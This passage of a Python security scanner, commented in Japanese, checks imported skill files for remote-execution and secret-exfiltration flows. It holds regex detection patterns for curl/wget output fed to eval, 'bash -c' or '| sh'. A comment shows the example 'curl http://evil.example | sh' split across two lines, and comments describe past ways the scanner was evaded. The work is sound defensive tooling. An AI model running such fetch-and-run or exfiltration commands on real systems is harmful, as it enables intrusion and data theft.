    return out


def _scan_line(
    rel_path: str, lineno: int, text: str, in_literal_zone: bool = False
) -> List[Finding]:
    # literal zone（フェンスコード内/frontmatter 内）では Markdown マーカー除去
    # だけを適用しない（#537 round3: そこでの `-`/`>` は Markdown 装飾でなく
    # 生のコード/データ）。Cf/Mn/Me 除去 + NFKC 正規化（`_normalize_for_matching`）
    # は literal zone でも適用する（#537 round6: 不可視文字・homoglyph による
    # 偽装は装飾か生コードかを問わない攻撃面のため。旧実装は literal zone を
    # `norm = text` と無条件の生文字列にしており、フェンス内の Cf 中間挿入・
    # 記号 homoglyph が正規化を一切受けず検出をすり抜けていた）。
    norm = (
        _normalize_for_matching(text)
        if in_literal_zone
        else _strip_leading_decoration(text)
    )
    found: List[Finding] = []
    for pattern_id, category, severity, regex in _PATTERNS:
        if regex.search(norm):
            found.append(
                Finding(
                    rel_path=rel_path,
                    line=lineno,
                    category=category,
                    severity=severity,
                    pattern_id=pattern_id,
                    snippet=_snippet(text),
                )
            )
    # secret_exfil: 秘密ソース + ネット sink の同一行共起。
    if _SECRET_SOURCE.search(norm) and _NET_SINK.search(norm):
        found.append(
            Finding(
                rel_path=rel_path,
                line=lineno,
                category="secret_exfil",
                severity="HIGH",
                pattern_id="secret_exfil.source_and_sink",
                snippet=_snippet(text),
            )
        )
    return found


# ============================================================================
# 静的フロー解析（マルチステップ攻撃系列の順序ペア検出・#123）— 追加のみ
# ----------------------------------------------------------------------------
# 行単位スキャン（_scan_line）はステートレスで「行 A（fetch）→ 行 B（exec）」の
# 系列を追えない。ここでは**同一ファイル内**（スコープはフェンス記法を問わずファイル
# 全体・後述）で、fetch 系がバインドした名前（変数 or ダウンロード先ファイル）が後続行
# の exec/送信ポジションで参照される順序ペアを決定論検出する。**producer/consumer が
# 別ファイルに分かれるケースは意図的にスコープ外**（skill 1 件が複数ファイルへ
# fetch/exec を分散させる攻撃は非検出。ファイル境界を越えた解析はしない）。
# 完全なデータフロー解析はせず、同名の代入→参照・コマンド置換・-o/> のファイル
# 受け渡しのみ最小限に追う（combo 必須方針の系列版）。
#
# FP 抑制の要:
# - producer は「fetch/read をコマンド置換で変数に束ねる」or「-o/> でファイルに
#   落とす」のみ登録する（bare な取得は非登録）。
# - consumer は変数を **コードとして** 実行する形（eval / -c / <<< / `| sh`）だけ拾い、
#   引数渡し（`bash local.sh "$V"`）は除外する。ダウンロードファイルは interpreter
#   直後（`bash FILE` / `./FILE` / `source FILE` / `chmod +x FILE`）のみ。
# - producer は consumer より前の行に限る（同一行 self-loop は登録を後回しにして排除）。
# - スコープはフェンス内外を問わず全行（#415 型再発の是正: 4スペース字下げ / `~~~` /
#   `<details>` / フェンス無し本文が非検出だった）。行番号距離の上限は設けない
#   （#415 追補: 距離キャップは「上限を超える行数だけ離せば検出を回避できる」新たな
#   迂回経路そのものであり、allowlist/除外リストと同じ骨抜き構造になる。導入時に
#   検出された FP の真因は _FLOW_FETCH_TO_FILE 側の `>` 誤認識バグであり、そちらを
#   修正した結果、距離キャップ無しでも 67 roots 実コーパスで新規誤検出は0件だった）。
# ============================================================================

# fetch 系ネットワーク取得コマンド（gh api を含む）。
_FLOW_FETCH_CMD = re.compile(r"(?i)(\b(?:curl|wget|fetch)\b|\bgh\s+api\b)")

# コマンド置換の存在（$( ... ) or `...`）。
_FLOW_CMD_SUBST = re.compile(r"\$\(|`")

# VAR=... 代入（先頭の変数名を捕捉。export 許容）。
_FLOW_ASSIGN = re.compile(r"^\s*(?:export\s+)?([A-Za-z_][A-Za-z0-9_]*)=(.*)$")

# fetch のダウンロード先ファイルを捕捉（-o/-O/--output/>/>>）。
# `<account_id>` のような山括弧プレースホルダ全体を先に同じ長さの `#` へマスクしてから
# マッチさせる（#415 追補2: 直前空白必須の lookbehind で誤認識を抑えた版は、
# `curl url>file` や stderr redirect `curl url 2>file` のような、bash として正当かつ
# 直前が空白でない redirect 記法を検出できなくする回帰を生んでいた実測がある — 変異
# 試験で両方とも flow_findings=[] のまま素通りすることを確認済み。プレースホルダの
# 識別は「直前が空白でないこと」ではなく「`<...>` に囲まれた語であること」で行う方が
# 誤認識の真因に近く、redirect 記法の空白有無に依存しない）。
_PLACEHOLDER_TOKEN = re.compile(r"<[A-Za-z0-9_.-]+>")

_FLOW_FETCH_TO_FILE = re.compile(
    r"(?i)\b(?:curl|wget|fetch)\b[^\n]*?"
    r"(?:-o|-O|--output|>>?)\s*['\"]?([^\s'\"|;&><`]+)"
)


def _mask_placeholder_tokens(text: str) -> str:
    """`<account_id>` 等の山括弧プレースホルダを同じ長さの `#` でマスクする。

    `_FLOW_FETCH_TO_FILE` がプレースホルダ内の `>` を redirect と誤認しないための
    前処理。キャプチャ位置・行文字列の長さを変えず、マスク後の文字列でのみ検索する
    （元の `text` はスニペット表示や他 regex に引き続き使う）。
    """
    return _PLACEHOLDER_TOKEN.sub(lambda m: "#" * len(m.group(0)), text)

# ダウンロード先として登録しない sink（/dev 系・stdout 記法）。
_FLOW_FILE_IGNORE = {"-", "/dev/null", "/dev/stdout", "/dev/stderr"}

# 変数を「コードとして」実行する形（引数渡しは除外＝FP 抑制）。{ref} に変数参照を埋める。
_EXEC_VAR_FORM_TEMPLATES = [
    r"(?i)\beval\b[^\n]*{ref}",  # eval "$V"
    # bash -c "$V" / sh -c / python -c / node -e / perl -e / ruby -e
    r"(?i)\b(?:(?:ba|z|k|d|a)?sh|python3?|node|perl|ruby)\b[^\n]*?\s-(?:c|e)\b[^\n]*{ref}",
    # bash <<< "$V" / python3 <<< "$V"
    r"(?i)\b(?:(?:ba|z|k|d|a)?sh|python3?)\b[^\n]*?<<<[^\n]*{ref}",
    # echo "$V" | sh   （変数参照が pipe より前、shell が後）
    r"(?i){ref}[^\n]*\|\s*(?:sudo\s+)?(?:ba|z|k|d|a)?sh\b",
]


def _var_ref_pattern(var: str) -> str:
    """$VAR / ${VAR} の参照を表す regex 断片（後続が識別子文字でないこと）。"""
    return r"\$\{?" + re.escape(var) + r"(?![A-Za-z0-9_])"


def _exec_var_regexes(var: str) -> List[Pattern[str]]:
    """変数 var を「コードとして」実行する consumer 行を判定する regex 群。"""
    ref = _var_ref_pattern(var)
    return [re.compile(t.format(ref=ref)) for t in _EXEC_VAR_FORM_TEMPLATES]


def _exec_file_regexes(fpath: str) -> List[Pattern[str]]:
    """ダウンロード済みファイル fpath を実行する consumer 行を判定する regex 群。"""
    ref = re.escape(fpath)
    base = re.escape(fpath.rsplit("/", 1)[-1])
    return [
        # bash FILE / sh FILE / source FILE / python FILE（flag を挟んでも可、直後の位置）
        re.compile(
            r"(?i)\b(?:(?:ba|z|k|d|a)?sh|source|python3?|node|perl|ruby)\s+"
            r"(?:-\S+\s+)*['\"]?" + ref
        ),
        re.compile(r"(?i)(?:^|;|&&|\|\|)\s*\.\s+['\"]?" + ref),  # . FILE（source 短縮）
        # ./FILE（basename 実行）— コマンド境界（^ / ; / & / | / ( / `）直後のみ。
        # 引数位置（`rm -rf ./x.deb` / `hdiutil attach ./x.dmg`）は非検出＝FP 抑制。
        re.compile(r"(?i)(?:^|[;&|(`])\s*\./" + base + r"\b"),
        re.compile(r"(?i)\bchmod\s+\+x\b[^\n]*" + ref),  # chmod +x FILE（実行準備）
    ]


def _detect_flows_in_scope(
    rel_path: str,
    scope_lines: List[Tuple[int, str]],
    literal_zone: "set | None" = None,
) -> List[FlowFinding]:
    """1 スコープ内の fetch→exec / read→exfil 順序ペアを検出する（決定論）。

    literal_zone: `_compute_literal_zone_lines` が返す行番号集合。含まれる行は
    フェンスコード/frontmatter 内なので装飾除去を適用しない（#537 round3）。
    """
    found: List[FlowFinding] = []
    fetch_vars: dict[str, Tuple[int, str]] = {}
    fetch_files: dict[str, Tuple[int, str]] = {}
    secret_vars: dict[str, Tuple[int, str]] = {}
    literal_zone = literal_zone or set()

    for lineno, text in scope_lines:
        # 装飾（blockquote `>` / リストマーカー等）を剥がした版で照合する
        # （#537 round2: `> D=$(...)` が _FLOW_ASSIGN の `^` アンカーに一致せず
        # 素通りしていた。snippet 表示には元の text を使う＝装飾を消さない）。
        # literal zone（フェンスコード内/frontmatter 内）では Markdown マーカー
        # 除去だけ剥がさない（#537 round3: そこでの `-`/`>` は diff の削除行・
        # YAML sequence・シェルのリダイレクトであり Markdown 装飾ではないため）。
        # Cf/Mn/Me 除去 + NFKC 正規化は literal zone でも適用する（#537 round6:
        # フェンス内の不可視文字・homoglyph 偽装も同じ攻撃面のため）。
        norm = (
            _normalize_for_matching(text)
            if lineno in literal_zone
            else _strip_leading_decoration(text)
        )

        # 1) consumer 判定は既登録 producer に対してのみ（＝producer 先行を強制）。
        for var, (pl, psnip) in fetch_vars.items():
            if any(rx.search(norm) for rx in _exec_var_regexes(var)):
                found.append(
                    FlowFinding(
                        rel_path, pl, lineno, "remote_exec_flow", "HIGH",
                        "remote_exec_flow.fetch_var_to_exec", var, psnip, _snippet(text),
                    )
                )
        for fpath, (pl, psnip) in fetch_files.items():
            if any(rx.search(norm) for rx in _exec_file_regexes(fpath)):
                found.append(
                    FlowFinding(
                        rel_path, pl, lineno, "remote_exec_flow", "HIGH",
                        "remote_exec_flow.fetch_file_to_exec", fpath, psnip, _snippet(text),
                    )
                )
        for var, (pl, psnip) in secret_vars.items():
            if re.search(_var_ref_pattern(var), norm) and _NET_SINK.search(norm):
                found.append(
                    FlowFinding(
                        rel_path, pl, lineno, "secret_exfil_flow", "HIGH",
                        "secret_exfil_flow.read_var_to_net", var, psnip, _snippet(text),
                    )
                )

        # 2) producer 登録は consumer 判定の後（同一行 self-loop を防ぐ）。
        m = _FLOW_ASSIGN.match(norm)
        if m:
            var, rhs = m.group(1), m.group(2)
            if _FLOW_CMD_SUBST.search(rhs):
                if _FLOW_FETCH_CMD.search(rhs):
                    fetch_vars.setdefault(var, (lineno, _snippet(text)))
                if _SECRET_SOURCE.search(rhs):
                    secret_vars.setdefault(var, (lineno, _snippet(text)))
        fm = _FLOW_FETCH_TO_FILE.search(_mask_placeholder_tokens(norm))
        if fm:
            fpath = fm.group(1)
            if fpath and fpath not in _FLOW_FILE_IGNORE:
                fetch_files.setdefault(fpath, (lineno, _snippet(text)))

    return found


def _iter_scopes(path: Path, text: str) -> List[List[Tuple[int, str]]]:
    """フロー解析のスコープを列挙する。

    拡張子・フェンス記法（``` / ~~~ / 4スペース字下げ / `<details>` / フェンス無し
    本文）を問わずファイル全体を 1 スコープとする（#415: フェンス限定 scope は
    4スペース字下げ・`~~~`・`<details>`・素の本文の combo を素通りさせていた）。
    **スコープは常に単一ファイル（同一ファイル内）に限定される**（呼び出し元
    `scan_skills` がファイル単位で `_iter_scopes` を呼ぶ設計そのものが境界）。
    別ファイルにまたがる producer/consumer は検出対象外（意図的なスコープ境界）。
    行番号距離の上限は設けない（#415 追補: 距離キャップ自体が「超えれば回避できる」
    迂回経路になるため撤廃。producer/consumer 誤連鎖の真因は _FLOW_FETCH_TO_FILE
    側の regex を修正して解消した）。行番号は原文基準で保持。
    """
    lines = text.splitlines()
    return [list(enumerate(lines, start=1))]


# ============================================================================
# シェル論理行の結合（物理改行によるパターン分断の是正・#537 round7 レビュー I5）
# ----------------------------------------------------------------------------
# シェルは行末が `|`（バックスラッシュ無しでも次行をパイプライン継続として読む）
# または `\`（明示的な行継続）で終わると、複数の物理行を 1 つの論理行として実行
# する。`_scan_line` は行単位 regex（同一行 combo 前提）のため、
#     curl http://evil.example |
#     sh
# のように combo を 2 物理行に分断されると `remote_exec.curl_pipe_sh` を検出
# できない（bash は 1 パイプラインとして実行する一方、scanner は両方とも []。
# レビュー実測 #537 round7 I5）。
#
# 「シェル上どこで論理行が区切れるか」の判定を本節に集約する（1箇所で完結させる
# 設計＝レビュー指示）。今回実装するのは末尾 `|`・末尾 `\` の2種のみだが、
# `&&`/`||`/`;`/ヒアドキュメント/複数行 `$( )` 等を今後追加する場合も
# `_is_shell_continuation` と `_join_logical_lines` の2関数だけを変更すれば足りる
# 構造にする（個別の記号を検出箇所ごとに1つずつ足す実装にしない）。
#
# 適用範囲は `.sh`/`.bash` ファイル全体、および Markdown 内のシェル系 fenced code
# block（info string が sh/bash/zsh/ksh/dash/shell/console のいずれか）の中身に限定
# する。Markdown の表（`| col1 | col2 |`）は `|` を多用するため、シェルスコープ外
# では本結合を適用しない（陽性対照: 表を誤って論理行結合しない）。
# ============================================================================

_SHELL_FENCE_INFO = {"sh", "bash", "zsh", "ksh", "dash", "shell", "console"}
_TRAILING_PIPE_RE = re.compile(r"\|\s*$")
_TRAILING_BACKSLASH_RE = re.compile(r"\\\s*$")


def _is_shell_continuation(stripped_line: str) -> bool:
    """行が次の物理行へ継続するシェル論理行の一部かどうか（末尾 `|` または `\\`）。"""
    return bool(
        _TRAILING_PIPE_RE.search(stripped_line)
        or _TRAILING_BACKSLASH_RE.search(stripped_line)
    )


def _compute_shell_scope_lines(lines: List[str]) -> set:
    """行番号（1始まり）の集合を返す。Markdown 内のシェル系 fenced code block
    （info string が `_SHELL_FENCE_INFO`）の**中身**の行のみを対象とする
    （fence マーカー行自体は含めない）。フェンス判定は `_compute_literal_zone_lines`
    と同じ「同種・同じ長さ以上の closer が実際に見つかった場合のみ閉じたとみなす」
    原則を再利用する（未閉じフェンスはスコープに含めず、以降のフェンス走査も
    打ち切る）。
    """
    scope: set = set()
    n = len(lines)
    stripped_lines = [raw.rstrip("\r\n") for raw in lines]
    idx = 0
    while idx < n:
        opener = _match_fence_opener(stripped_lines[idx])
        if opener is None:
            idx += 1
            continue
        ch, min_len = opener
        m = _FENCE_OPENER.match(stripped_lines[idx])
        info = m.group(2) if m else ""
        info_word = info.strip().split()[0].lower() if info.strip() else ""
        close_at = None
        for j in range(idx + 1, n):
            if _match_fence_closer(stripped_lines[j], ch, min_len):
                close_at = j
                break
        if close_at is None:
            # 未閉じ: スコープを作らず、以降のフェンス走査自体を打ち切る
            # （`_compute_literal_zone_lines` と同方針）。
            break
        if info_word in _SHELL_FENCE_INFO:
            for k in range(idx + 1, close_at):
                scope.add(k + 1)
        idx = close_at + 1
    return scope


def _join_logical_lines(
    lines: List[str], scope_linenos: set
) -> List[Tuple[int, str]]:
    """scope_linenos（1始まり）に属する行のうち、シェル継続で分割された物理行を
    1つの論理行へ結合する。戻り値は (先頭物理行番号, 結合済みテキスト) のリスト
    （継続していない行は含めない — 呼び出し側は既存の物理行単位スキャンに
    **追加**して使う設計で、単独行スキャンを置き換えない）。

    末尾 `|` は結合後の照合に `|` 自体が必要なため残したまま次行を連結する。
    末尾 `\\`（行継続）は記号自体を落として連結する（シェル上は改行が消えるだけで
    バックスラッシュはコマンドの一部ではないため）。
    """
    out: List[Tuple[int, str]] = []
    n = len(lines)
    idx = 0
    while idx < n:
        lineno = idx + 1
        stripped = lines[idx].rstrip("\r\n")
        if lineno not in scope_linenos or not _is_shell_continuation(stripped):
            idx += 1
            continue
        start_lineno = lineno
        buf = stripped
        j = idx + 1
        while _is_shell_continuation(buf) and j < n and (j + 1) in scope_linenos:
            nxt = lines[j].rstrip("\r\n")
            if _TRAILING_BACKSLASH_RE.search(buf):
                buf = _TRAILING_BACKSLASH_RE.sub("", buf).rstrip() + " " + nxt.strip()
            else:
                buf = buf.rstrip() + " " + nxt.strip()
            j += 1
        out.append((start_lineno, buf))
        idx = j
    return out


def scan_skills(root: Path) -> SkillVulnReport:
    """root/skills/ 配下の取り込みスキルを静的スキャンして脆弱性 Finding を返す（決定論）。"""
    root = Path(root)
    skills_dir = root / "skills"
    if not skills_dir.is_dir():
        return SkillVulnReport(applicable=False, scanned_files=0, findings=[])

    findings: List[Finding] = []
    flow_findings: List[FlowFinding] = []
    scan_errors: List[str] = []
    scanned = 0
    for path in _iter_target_files(skills_dir):
        rel = path.relative_to(root).as_posix()
        try:
            # #537 round4 是正（レビュー I4）: "utf-8-sig" は先頭 BOM（U+FEFF）が
            # あれば除去し、無ければ通常の UTF-8 デコードと同じ結果を返す。BOM
            # 付き先頭 "---" が `stripped == "---"` の完全一致判定から外れ
            # frontmatter と認識されない誤検出（実測 literal=[], flows=[(3,4)]）
            # を、装飾除去側（Cf カテゴリ剥がし）でなく読み込み時点で解消する。
            text = path.read_text(encoding="utf-8-sig")
        except OSError as exc:
            # #537 round2: 無言 skip すると残りだけ数えて「危険パターン検出なし」に
            # 見えてしまう（silence != evaluated）。読取失敗は critical として surface
            # する（builder 側で report.evaluated=False として扱われる）。
            scan_errors.append(f"{rel}: 読取失敗（{exc.__class__.__name__}: {exc}）")
            continue
        except UnicodeDecodeError as exc:
            scan_errors.append(f"{rel}: UTF-8 デコード失敗（{exc}）")
            continue
        scanned += 1
        lines = text.splitlines()
        literal_zone = _compute_literal_zone_lines(lines)
        existing_keys: set = set()
        for idx, line in enumerate(lines, start=1):
            for f in _scan_line(rel, idx, line, idx in literal_zone):
                findings.append(f)
                existing_keys.add((f.line, f.pattern_id))
        for scope in _iter_scopes(path, text):
            flow_findings.extend(_detect_flows_in_scope(rel, scope, literal_zone))

        # #537 round7 是正（レビュー I5）: シェル継続行（末尾 `|`・`\`）で
        # 物理分断された combo を論理行へ結合してから追加スキャンする。
        # 既存の物理行単位スキャン（上）を置き換えず、そこで未検出だった
        # (行, pattern_id) の組だけを追加する（重複 Finding を作らない）。
        shell_scope = (
            set(range(1, len(lines) + 1))
            if path.suffix.lower() in (".sh", ".bash")
            else _compute_shell_scope_lines(lines)
        )
        for start_lineno, joined_text in _join_logical_lines(lines, shell_scope):
            for f in _scan_line(
                rel, start_lineno, joined_text, start_lineno in literal_zone
            ):
                if (f.line, f.pattern_id) in existing_keys:
                    continue
                findings.append(f)
                existing_keys.add((f.line, f.pattern_id))

    findings.sort(key=lambda f: (f.rel_path, f.line, f.pattern_id))
    flow_findings.sort(
        key=lambda f: (f.rel_path, f.producer_line, f.consumer_line, f.pattern_id)
    )
    scan_errors.sort()
    return SkillVulnReport(
        applicable=True,
        scanned_files=scanned,
        findings=findings,
        flow_findings=flow_findings,
        scan_errors=scan_errors,
    )
